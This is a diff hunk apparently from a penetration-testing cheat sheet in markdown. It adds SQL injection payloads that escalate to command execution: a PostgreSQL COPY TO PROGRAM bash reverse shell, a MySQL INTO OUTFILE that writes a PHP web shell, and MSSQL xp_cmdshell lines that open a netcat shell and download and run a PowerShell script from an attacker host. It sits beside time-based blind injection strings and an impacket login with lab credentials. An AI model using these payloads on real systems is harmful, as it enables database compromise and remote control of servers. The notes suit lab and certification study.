@@ -551,7 +551,14 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     - time-based
       `offsec' AND IF (1=1, sleep(3),'false') -- //`  
       `'; IF (SELECT SUBSTRING(@@version,1,1)) = 'M' WAITFOR DELAY '0:0:3'--`
-      Postgresql: `' AND 3176=(SELECT 3176 FROM PG_SLEEP(5))-- HlYW`  
+      Postgresql: `' AND 3176=(SELECT 3176 FROM PG_SLEEP(5))-- HlYW`
+  - PostgreSQL: COPY … TO PROGRAM  
+    `<PARAM>=1'; COPY (SELECT '') TO PROGRAM 'bash+-c+"bash+-i+>%26+/dev/tcp/<kali>/80+0>%261"`
+  - MySQL: SELECT … INTO OUTFILE
+    `SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';`
+  - MSSQL: xp_cmdshell
+    `EXEC xp_cmdshell 'nc.exe <kali> 80 -e cmd.exe';`
+    `EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(''http://<kali>/shell.ps1'')"';`  
   - xp_cmdshell
     ```
     impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
